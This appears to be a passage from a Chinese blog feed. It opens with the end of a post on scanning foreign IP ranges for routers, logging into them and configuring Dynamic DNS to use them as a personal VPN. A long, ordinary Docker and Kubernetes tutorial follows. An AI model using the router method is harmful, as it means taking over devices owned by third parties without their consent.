<p><img src="/img/oldboy/wKiom1WWpfWQKAXJAAMctKmM25c785.jpg" alt="技术分享"></p>
<p>案例二：动手制作自己的免费VPN，实现FQ功能</p>
<p> 1、设置还是跟上一个案例设置一样，唯一不同的是在设置IP地址段时，把IP地址段设置为国外的IP地址段，以扫描国外可用做自己VPN的路由器主机。国外的IP地址段可以利用百度，谷歌等搜索引擎进行收集；</p>
<p>  2、扫描出结果之后，就可以登录路由器，查看里面是否具有Dynamic DNS也就是动态DNS功能，如果有，则进行简单的设置就可以了。如图：<img src="/img/oldboy/wKioL1WWrk3w3lIOAAOAZp5C0Ro290.jpg" alt="技术分享"></p>
<p>这个DDNS设置，需要你先到<a href="http://www.dyndns.org这个网站上注册一个帐号及子域名才可用.配置好之后,点击应用.然后再配置一下我们电脑端的vpn连接./">www.DynDNS.org这个网站上注册一个帐号及子域名才可用。配置好之后，点击应用。然后再配置一下我们电脑端的VPN连接。</a></p>
<p><img src="/img/oldboy/wKiom1WWrwWiqI9ZAAFbHeXodtc835.jpg" alt="技术分享"></p>
<p><img src="http://s3.51cto.com/wyfs02/M02/6F/49/wKiom1WWrwWB7eWvAACo_l1zZyE903.jpg" alt="技术分享"></p>
<p> 如图，VPN地址处填写我们在DynDDNS.org这个网站上申请的主机名称，用户名和密码就填写我们申请的就可以了。这样即使是路由器重启了，重新分配了不同的IP地址，我们也还是能够通过它进行VPN拨号连接！妈妈再也不用担心我访问不了Youtube了，oh yeah!</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-云原生技术</title>
    <url>/posts/1d2f039a.html</url>
    <content><![CDATA[<h1 id="云平台核心"><a href="#云平台核心" class="headerlink" title="云平台核心"></a>云平台核心</h1><p><strong>1、为什么用云平台</strong></p>
<ul>
<li>环境统一</li>
<li>按需付费</li>
<li>即开即用</li>
<li>稳定性强</li>
</ul>
<p>国内常见云平台：</p>
<ul>
<li><a href="https://promotion.aliyun.com/ntms/act/ambassador/sharetouser.html?userCode=50sid5bu&utm_source=50sid5bu">阿里云</a>百度云，<a href="https://curl.qcloud.com/iyFTRSJb">腾讯云</a>、<a href="https://activity.huaweicloud.com/discount_area_v5/index.html?fromacct=d1a6f32e-d6d0-4702-9213-eafe022a0708&utm_source=bGVpZmVuZ3lhbmc==&utm_medium=cps&utm_campaign=201905">华为云</a>、青云……</li>
</ul>
<p>国外常见云平台：</p>
<ul>
<li>亚马逊 AWS、微软 Azure …</li>
</ul>
<h2 id="1-公有云"><a href="#1-公有云" class="headerlink" title="1.公有云"></a>1.公有云</h2><!--购买云服务商提供的公共服务器-->、

<p>公有云是最常见的云计算部署类型。公有云资源（例如服务器和存储空间）由第三方云服务提供商拥有和运营，这些资源通过 Internet 提供。在公有云中，所有硬件、软件和其他支持性基础结构均为云提供商所拥有和管理。Microsoft Azure 是公有云的一个示例。</p>
<p>在公有云中，你与其他组织或云“租户”共享相同的硬件、存储和网络设备，并且你可以使用 Web 浏览器访问服务和管理帐户。公有云部署通常用于提供基于 Web 的电子邮件、网上办公应用、存储以及测试和开发环境。</p>
<p>公有云优势：</p>
<ul>
<li><p><strong>成本更低</strong>：无需购买硬件或软件，仅对使用的服务付费。</p>
</li>
<li><p><strong>无需维护</strong>：维护由服务提供商提供。</p>
</li>
<li><p><strong>近乎无限制的缩放性</strong>：提供按需资源，可满足业务需求。</p>
</li>
<li><p><strong>高可靠性</strong>：具备众多服务器，确保免受故障影响。</p>
</li>
<li><p><strong>可用性： N个9   9   全年的故障时间： 365<em>24</em>3600*(1-99.9999%）</strong></p>
</li>
</ul>
<h2 id="2-私有云"><a href="#2-私有云" class="headerlink" title="2.私有云"></a>2.私有云</h2><!--自己搭建云平台，或者购买-->

<p>私有云由专供一个企业或组织使用的云计算资源构成。私有云可在物理上位于组织的现场数据中心，也可由第三方服务提供商托管。但是，在私有云中，服务和基础结构始终在私有网络上进行维护，硬件和软件专供组织使用。</p>
<p>这样，私有云可使组织更加方便地自定义资源，从而满足特定的 IT 需求。私有云的使用对象通常为政府机构、金融机构以及其他具备业务关键性运营且希望对环境拥有更大控制权的中型到大型组织。</p>
<p>私有云优势：</p>
<ul>
<li><strong>灵活性更强</strong>：组织可自定义云环境以满足特定业务需求。</li>
<li><strong>控制力更强</strong>：资源不与其他组织共享，因此能获得更高的控制力以及更高的隐私级别。</li>
<li><strong>可伸缩性更强</strong>：与本地基础结构相比，私有云通常具有更强的可伸缩性。</li>
</ul>
<p><strong>没有一种云计算类型适用于所有人。多种不同的云计算模型、类型和服务已得到发展，可以满足组织快速变化的技术需求。</strong></p>
<p><strong>部署云计算资源有三种不同的方法：公共云、私有云和混合云。采用的部署方法取决于业务需求。</strong></p>
<h2 id="3-核心架构"><a href="#3-核心架构" class="headerlink" title="3.核心架构"></a>3.核心架构</h2><p><strong>①所需软件</strong></p>
<p><a href="https://electerm.github.io/electerm/">electerm</a>：  <a href="https://electerm.github.io/electerm/">https://electerm.github.io/electerm/</a></p>
<p>（<a href="https://wwa.lanzoui.com/b016k9bha">https://wwa.lanzoui.com/b016k9bha</a></p>
<p>密码:900h）</p>
<p>  <strong>注册云平台</strong></p>
<ul>
<li><a href="https://www.aliyun.com/daily-act/ecs/activity_selection?userCode=50sid5bu">阿里云</a>   aliyun.com </li>
<li><a href="https://curl.qcloud.com/iyFTRSJb">腾讯云</a>   cloud.tencent.com</li>
<li><a href="https://activity.huaweicloud.com/discount_area_v5/index.html?fromacct=d1a6f32e-d6d0-4702-9213-eafe022a0708&utm_source=bGVpZmVuZ3lhbmc==&utm_medium=cps&utm_campaign=201905">华为云</a>   cloud.huawei.com</li>
</ul>
<p><a href="https://www.qingcloud.com/promotion2021">青云</a>       qingcloud.com</p>
<p><a href="http://cloud.baidu.com/">百度云</a>    cloud.baidu.com</p>
<h2 id="4-基础概念"><a href="#4-基础概念" class="headerlink" title="4.基础概念"></a>4.基础概念</h2><ul>
<li><strong>云服务器作为应用的最终载体</strong></li>
<li><strong>VPC为所有云服务器提供网络隔离</strong></li>
<li><strong>所有云服务器都是绑定某个私有网络</strong></li>
<li><strong>安全组控制每个服务器的防火墙规则</strong></li>
<li><strong>公网IP使得资源可访问</strong></li>
<li><strong>端口转发的方式访问到具体服务器</strong></li>
</ul>
<h1 id="Docker基础"><a href="#Docker基础" class="headerlink" title="Docker基础"></a>Docker基础</h1><h2 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h2><h3 id="一-解决的问题"><a href="#一-解决的问题" class="headerlink" title="一.解决的问题"></a>一.解决的问题</h3><p><strong>1.统一标准</strong></p>
<ul>
<li><p>应用构建 </p>
</li>
<li><ul>
<li>Java、C++、JavaScript</li>
<li>打成软件包</li>
<li>.exe</li>
<li>docker build ….   镜像</li>
</ul>
</li>
<li><p>应用分享</p>
</li>
<li><ul>
<li>所有软件的镜像放到一个指定地方  docker hub</li>
<li>安卓，应用市场</li>
</ul>
</li>
<li><p>应用运行</p>
</li>
<li><ul>
<li>统一标准的 <strong>镜像</strong></li>
<li>docker run</li>
</ul>
</li>
<li><p>…….</p>
</li>
</ul>
<p><strong>2.资源隔离</strong></p>
<ul>
<li>cpu、memory资源隔离与限制</li>
<li>访问设备隔离与限制</li>
<li>网络隔离与限制</li>
<li>用户、用户组隔离限制</li>
</ul>
<h3 id="二-架构"><a href="#二-架构" class="headerlink" title="二.架构"></a>二.架构</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/svg/1613913/1624937894925-f437bd98-94e2-4334-9657-afa69bb52179.svg" alt="img"></p>
<ul>
<li><p>Docker_Host：</p>
</li>
<li><ul>
<li>安装Docker的主机</li>
</ul>
</li>
<li><p>Docker Daemon：</p>
</li>
<li><ul>
<li>运行在Docker主机上的Docker后台进程</li>
</ul>
</li>
<li><p>Client：</p>
</li>
<li><ul>
<li>操作Docker主机的客户端（命令行、UI等）</li>
</ul>
</li>
<li><p>Registry：</p>
</li>
<li><ul>
<li>镜像仓库</li>
<li>Docker Hub</li>
</ul>
</li>
<li><p>Images：</p>
</li>
<li><ul>
<li>镜像，带环境打包好的程序，可以直接启动运行</li>
</ul>
</li>
<li><p>Containers：</p>
</li>
<li><ul>
<li>容器，由镜像启动起来正在运行中的程序</li>
</ul>
</li>
</ul>
<p><strong>交互逻辑</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">装好Docker，然后去 软件市场 寻找镜像，下载并运行，查看容器状态日志等排错</span><br></pre></td></tr></table></figure>

<h3 id="三-安装"><a href="#三-安装" class="headerlink" title="三.安装"></a>三.安装</h3><h4 id="1、centos下安装docker"><a href="#1、centos下安装docker" class="headerlink" title="1、centos下安装docker"></a>1、centos下安装docker</h4><p><strong>文档</strong></p>
<p><strong><a href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></strong></p>
<h4 id="①移除以前docker相关包"><a href="#①移除以前docker相关包" class="headerlink" title="①移除以前docker相关包"></a>①移除以前docker相关包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>



<h4 id="②配置yum源"><a href="#②配置yum源" class="headerlink" title="②配置yum源"></a>②配置yum源</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install -y yum-utils</span><br><span class="line"><span class="built_in">sudo</span> yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<h4 id="③安装docker"><a href="#③安装docker" class="headerlink" title="③安装docker"></a>③安装docker</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#以下是在安装k8s的时候使用</span></span><br><span class="line">yum install -y docker-ce-20.10.7 docker-ce-cli-20.10.7  containerd.io-1.4.6</span><br></pre></td></tr></table></figure>

<h4 id="④启动"><a href="#④启动" class="headerlink" title="④启动"></a>④启动</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker --now</span><br></pre></td></tr></table></figure>

<h4 id="⑤配置加速"><a href="#⑤配置加速" class="headerlink" title="⑤配置加速"></a>⑤配置加速</h4><p><code>这里额外添加了docker的生产环境核心配置cgroup</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://82m9ar63.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>],</span><br><span class="line">  <span class="string">&quot;log-driver&quot;</span>: <span class="string">&quot;json-file&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;max-size&quot;</span>: <span class="string">&quot;100m&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;storage-driver&quot;</span>: <span class="string">&quot;overlay2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="Docker命令实战"><a href="#Docker命令实战" class="headerlink" title="Docker命令实战"></a>Docker命令实战</h2><p><strong>常用命令</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1625373590853-2aaaa76e-d5b5-446b-850a-f6cfa26ac70a.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_85,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_996,limit_0" alt="image.png"></p>
<h3 id="基础实战"><a href="#基础实战" class="headerlink" title="基础实战"></a>基础实战</h3><h4 id="①找镜像"><a href="#①找镜像" class="headerlink" title="①找镜像"></a>①找镜像</h4><p><strong>去<a href="http://hub.docker.com/">docker hub</a>，找到nginx镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx  <span class="comment">#下载最新版</span></span><br><span class="line"></span><br><span class="line">镜像名:版本名（标签）</span><br><span class="line"></span><br><span class="line">docker pull nginx:1.20.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker pull redis  <span class="comment">#下载最新</span></span><br><span class="line">docker pull redis:6.2.4</span><br><span class="line"></span><br><span class="line"><span class="comment">## 下载来的镜像都在本地</span></span><br><span class="line">docker images  <span class="comment">#查看所有镜像</span></span><br><span class="line"></span><br><span class="line">redis = redis:latest</span><br><span class="line"></span><br><span class="line">docker rmi 镜像名:版本号/镜像<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<h4 id="②启动容器"><a href="#②启动容器" class="headerlink" title="②启动容器"></a>②启动容器</h4><p><code>启动nginx应用容器，并映射88端口，测试的访问</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"></span><br><span class="line">【docker run  设置项   镜像名  】 镜像启动运行的命令（镜像里面默认有的，一般不会写）</span><br><span class="line"></span><br><span class="line"><span class="comment"># -d：后台运行</span></span><br><span class="line"><span class="comment"># --restart=always: 开机自启</span></span><br><span class="line">docker run --name=mynginx   -d  --restart=always -p  88:80   nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 查看所有</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment"># 删除停止的容器</span></span><br><span class="line">docker <span class="built_in">rm</span>  容器<span class="built_in">id</span>/名字</span><br><span class="line">docker <span class="built_in">rm</span> -f mynginx   <span class="comment">#强制删除正在运行中的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#停止容器</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span>/名字</span><br><span class="line"><span class="comment">#再次启动</span></span><br><span class="line">docker start 容器<span class="built_in">id</span>/名字</span><br><span class="line"></span><br><span class="line"><span class="comment">#应用开机自启</span></span><br><span class="line">docker update 容器<span class="built_in">id</span>/名字 --restart=always</span><br></pre></td></tr></table></figure>

<h4 id="③修改容器内容"><a href="#③修改容器内容" class="headerlink" title="③修改容器内容"></a>③修改容器内容</h4><p><code>修改默认的index.html 页面</code></p>
<h5 id="Ⅰ-进入容器内部修改"><a href="#Ⅰ-进入容器内部修改" class="headerlink" title="Ⅰ.进入容器内部修改"></a><strong>Ⅰ.进入容器内部修改</strong></h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入容器内部的系统，修改容器内容</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span>  /bin/bash</span><br></pre></td></tr></table></figure>

<h5 id="Ⅱ-挂在数据到外部修改"><a href="#Ⅱ-挂在数据到外部修改" class="headerlink" title="Ⅱ.挂在数据到外部修改"></a><strong>Ⅱ.挂在数据到外部修改</strong></h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run --name=mynginx   \</span><br><span class="line">-d  --restart=always \</span><br><span class="line">-p  88:80 -v /data/html:/usr/share/nginx/html:ro  \</span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改页面只需要去 主机的 /data/html</span></span><br></pre></td></tr></table></figure>

<h4 id="④提交改变"><a href="#④提交改变" class="headerlink" title="④提交改变"></a><strong>④提交改变</strong></h4><p><code>将自己修改好的镜像提交</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">docker commit -a <span class="string">&quot;leifengyang&quot;</span>  -m <span class="string">&quot;首页变化&quot;</span> 341d81f7504f guignginx:v1.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="Ⅰ镜像传输"><a href="#Ⅰ镜像传输" class="headerlink" title="Ⅰ镜像传输"></a>Ⅰ镜像传输</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将镜像保存成压缩包</span></span><br><span class="line">docker save -o abc.tar guignginx:v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 别的机器加载这个镜像</span></span><br><span class="line">docker load -i abc.tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 离线安装</span></span><br></pre></td></tr></table></figure>

<h4 id="⑤推送远程仓库"><a href="#⑤推送远程仓库" class="headerlink" title="⑤推送远程仓库"></a>⑤推送远程仓库</h4><p><code>推送镜像到docker hub；应用市场</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker tag local-image:tagname new-repo:tagname</span><br><span class="line">docker push new-repo:tagname</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把旧镜像的名字，改成仓库要求的新版名字</span></span><br><span class="line">docker tag guignginx:v1.0 leifengyang/guignginx:v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录到docker hub</span></span><br><span class="line">docker login       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">logout</span>（推送完成镜像后退出）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送</span></span><br><span class="line">docker push leifengyang/guignginx:v1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 别的机器下载</span></span><br><span class="line">docker pull leifengyang/guignginx:v1.0</span><br></pre></td></tr></table></figure>

<h4 id="⑥补充"><a href="#⑥补充" class="headerlink" title="⑥补充"></a>⑥补充</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker logs 容器名/id   排错</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 经常修改nginx配置文件</span></span><br><span class="line">docker run -d -p 80:80 \</span><br><span class="line">-v /data/html:/usr/share/nginx/html:ro \</span><br><span class="line">-v /data/conf/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">--name mynginx-02 \</span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#把容器指定位置的东西复制出来 </span></span><br><span class="line">docker <span class="built_in">cp</span> 5eff66eec7e1:/etc/nginx/nginx.conf  /data/conf/nginx.conf</span><br><span class="line"><span class="comment">#把外面的内容复制到容器里面</span></span><br><span class="line">docker <span class="built_in">cp</span>  /data/conf/nginx.conf  5eff66eec7e1:/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<h3 id="进阶实战"><a href="#进阶实战" class="headerlink" title="进阶实战"></a>进阶实战</h3><h4 id="①编写自己的应用"><a href="#①编写自己的应用" class="headerlink" title="①编写自己的应用"></a>①编写自己的应用</h4><p>java-demo.jar</p>
<h4 id="②将应用打包成镜像"><a href="#②将应用打包成镜像" class="headerlink" title="②将应用打包成镜像"></a>②将应用打包成镜像</h4><p>编写Dockerfile将自己的应用打包镜像</p>
<h5 id="Ⅰ以前"><a href="#Ⅰ以前" class="headerlink" title="Ⅰ以前"></a>Ⅰ以前</h5><p><strong>java为例</strong></p>
<ul>
<li>SpringBoot打包成可执行jar</li>
<li>把jar包上传给服务</li>
<li>服务器运行java -jar</li>
</ul>
<h5 id="Ⅱ现在"><a href="#Ⅱ现在" class="headerlink" title="Ⅱ现在"></a>Ⅱ现在</h5><p>所有机器都安装Docker，任何应用都是镜像，所有机器都可以运行</p>
<h5 id="Ⅲ如何打包"><a href="#Ⅲ如何打包" class="headerlink" title="Ⅲ如何打包"></a>Ⅲ如何打包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM openjdk:8-jdk-slim</span><br><span class="line">LABEL maintainer=leifengyang</span><br><span class="line"></span><br><span class="line">COPY target/*.jar   /app.jar</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;]</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t java-demo:v1.0 .</span><br></pre></td></tr></table></figure>

<p><code>思考： 每个应用每次打包，都需要本地编译、再上传服务器、再进行docker构建，如果有1000个应用要打包镜像怎么办？有没有更好的方式？</code></p>
<h4 id="③启动容器"><a href="#③启动容器" class="headerlink" title="③启动容器"></a>③启动容器</h4><p><code>启动容器</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8080:8080 --name myjava-app java-demo:v1.0 </span><br></pre></td></tr></table></figure>

<p><code>分享镜像</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 登录docker hub</span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line">#给旧镜像起名</span><br><span class="line">docker tag java-demo:v1.0  leifengyang/java-demo:v1.0</span><br><span class="line"></span><br><span class="line"># 推送到docker hub</span><br><span class="line">docker push leifengyang/java-demo:v1.0</span><br><span class="line"></span><br><span class="line"># 别的机器</span><br><span class="line">docker pull leifengyang/java-demo:v1.0</span><br><span class="line"></span><br><span class="line"># 别的机器运行</span><br><span class="line">docker run -d -p 8080:8080 --name myjava-app java-demo:v1.0 </span><br></pre></td></tr></table></figure>

<p>④部署中间件</p>
<p><code>部署一个Redis+应用，尝试应用操作Redis产生数据</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"></span><br><span class="line"><span class="comment">#redis使用自定义配置文件启动</span></span><br><span class="line"></span><br><span class="line">docker run -v /data/redis/redis.conf:/etc/redis/redis.conf \</span><br><span class="line">-v /data/redis/data:/data \</span><br><span class="line">-d --name myredis \</span><br><span class="line">-p 6379:6379 \</span><br><span class="line">redis:latest  redis-server /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Kubernetes实战入门"><a href="#Kubernetes实战入门" class="headerlink" title="Kubernetes实战入门"></a><strong>Kubernetes实战入门</strong></h1><h2 id="Kubernetes基础概念"><a href="#Kubernetes基础概念" class="headerlink" title="Kubernetes基础概念"></a>Kubernetes基础概念</h2><h3 id="一-是什么"><a href="#一-是什么" class="headerlink" title="一.是什么"></a>一.是什么</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1625452569657-833e64b2-1403-4fb6-9ee3-1e166504ccf0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_54,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<p><code>我们急需一个大规模容器编排系统</code></p>
<p>kubernetes具有以下特性：</p>
<ul>
<li><strong>服务发现和负载均衡</strong><br>Kubernetes 可以使用 DNS 名称或自己的 IP 地址公开容器，如果进入容器的流量很大， Kubernetes 可以负载均衡并分配网络流量，从而使部署稳定。</li>
<li><strong>存储编排</strong><br>Kubernetes 允许你自动挂载你选择的存储系统，例如本地存储、公共云提供商等。</li>
<li><strong>自动部署和回滚</strong><br>你可以使用 Kubernetes 描述已部署容器的所需状态，它可以以受控的速率将实际状态 更改为期望状态。例如，你可以自动化 Kubernetes 来为你的部署创建新容器， 删除现有容器并将它们的所有资源用于新容器。</li>
<li><strong>自动完成装箱计算</strong><br>Kubernetes 允许你指定每个容器所需 CPU 和内存（RAM）。 当容器指定了资源请求时，Kubernetes 可以做出更好的决策来管理容器的资源。</li>
<li><strong>自我修复</strong><br>Kubernetes 重新启动失败的容器、替换容器、杀死不响应用户定义的 运行状况检查的容器，并且在准备好服务之前不将其通告给客户端。</li>
<li><strong>密钥与配置管理</strong><br>Kubernetes 允许你存储和管理敏感信息，例如密码、OAuth 令牌和 ssh 密钥。 你可以在不重建容器镜像的情况下部署和更新密钥和应用程序配置，也无需在堆栈配置中暴露密钥。</li>
</ul>
<p>*<em>Kubernetes 为你提供了一个可弹性运行分布式系统的框架。 Kubernetes 会满足你的扩展要求、故障转移、部署模式等。 例如，Kubernetes 可以轻松管理系统的 Canary 部署。*</em></p>
<h3 id="二-架构-1"><a href="#二-架构-1" class="headerlink" title="二.架构"></a>二.架构</h3><h4 id="1-工作方式"><a href="#1-工作方式" class="headerlink" title="1.工作方式"></a>1.工作方式</h4><p>Kubernetes <strong>Cluster</strong> <strong>&#x3D;</strong> N <strong>Master</strong> Node <strong>+</strong> N <strong>Worker</strong> Node：N主节点+N工作节点； N&gt;&#x3D;1</p>
<h4 id="2-组件架构"><a href="#2-组件架构" class="headerlink" title="2.组件架构"></a>2.组件架构</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1625452728905-e72041a2-cf1b-4b24-a327-7f0c3974a931.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_54,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_937,limit_0" alt="image.png"></p>
<h5 id="①控制平面组件（Control-Plane-Components）"><a href="#①控制平面组件（Control-Plane-Components）" class="headerlink" title="①控制平面组件（Control Plane Components）"></a>①控制平面组件（Control Plane Components）</h5><p>控制平面的组件对集群做出全局决策(比如调度)，以及检测和响应集群事件（例如，当不满足部署的 <code>replicas</code> 字段时，启动新的 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">pod</a>）。</p>
<p>控制平面组件可以在集群中的任何节点上运行。 然而，为了简单起见，设置脚本通常会在同一个计算机上启动所有控制平面组件， 并且不会在此计算机上运行用户容器。 请参阅<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/high-availability/">使用 kubeadm 构建高可用性集群</a> 中关于多 VM 控制平面设置的示例。</p>
<h6 id="kube-apiserver"><a href="#kube-apiserver" class="headerlink" title="kube-apiserver"></a>kube-apiserver</h6><p>API 服务器是 Kubernetes <a href="https://kubernetes.io/zh/docs/reference/glossary/?all=true#term-control-plane">控制面</a>的组件， 该组件公开了 Kubernetes API。 API 服务器是 Kubernetes 控制面的前端。</p>
<p>Kubernetes API 服务器的主要实现是 <a href="https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kube-apiserver/">kube-apiserver</a>。 kube-apiserver 设计上考虑了水平伸缩，也就是说，它可通过部署多个实例进行伸缩。 你可以运行 kube-apiserver 的多个实例，并在这些实例之间平衡流量。</p>
<h6 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h6><p>etcd 是兼具一致性和高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库。</p>
<p>您的 Kubernetes 集群的 etcd 数据库通常需要有个备份计划。</p>
<p>要了解 etcd 更深层次的信息，请参考 <a href="https://etcd.io/docs/">etcd 文档</a>。</p>
<h6 id="kube-scheduler"><a href="#kube-scheduler" class="headerlink" title="kube-scheduler"></a>kube-scheduler</h6><p>控制平面组件，负责监视新创建的、未指定运行<a href="https://kubernetes.io/zh/docs/concepts/architecture/nodes/">节点（node）</a>的 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pods</a>，选择节点让 Pod 在上面运行。</p>
<p>调度决策考虑的因素包括单个 Pod 和 Pod 集合的资源需求、硬件&#x2F;软件&#x2F;策略约束、亲和性和反亲和性规范、数据位置、工作负载间的干扰和最后时限。</p>
<h6 id="kube-controller-manager"><a href="#kube-controller-manager" class="headerlink" title="kube-controller-manager"></a>kube-controller-manager</h6><p>在主节点上运行 <a href="https://kubernetes.io/zh/docs/concepts/architecture/controller/">控制器</a> 的组件。</p>
<p>从逻辑上讲，每个<a href="https://kubernetes.io/zh/docs/concepts/architecture/controller/">控制器</a>都是一个单独的进程， 但是为了降低复杂性，它们都被编译到同一个可执行文件，并在一个进程中运行。</p>
<p>这些控制器包括:</p>
<ul>
<li>节点控制器（Node Controller）: 负责在节点出现故障时进行通知和响应</li>
<li>任务控制器（Job controller）: 监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成</li>
<li>端点控制器（Endpoints Controller）: 填充端点(Endpoints)对象(即加入 Service 与 Pod)</li>
<li>服务帐户和令牌控制器（Service Account &amp; Token Controllers）: 为新的命名空间创建默认帐户和 API 访问令牌</li>
</ul>
<h6 id="cloud-controller-manager"><a href="#cloud-controller-manager" class="headerlink" title="cloud-controller-manager"></a>cloud-controller-manager</h6><p>云控制器管理器是指嵌入特定云的控制逻辑的 <a href="https://kubernetes.io/zh/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>组件。 云控制器管理器允许您链接集群到云提供商的应用编程接口中， 并把和该云平台交互的组件与只和您的集群交互的组件分离开。</p>
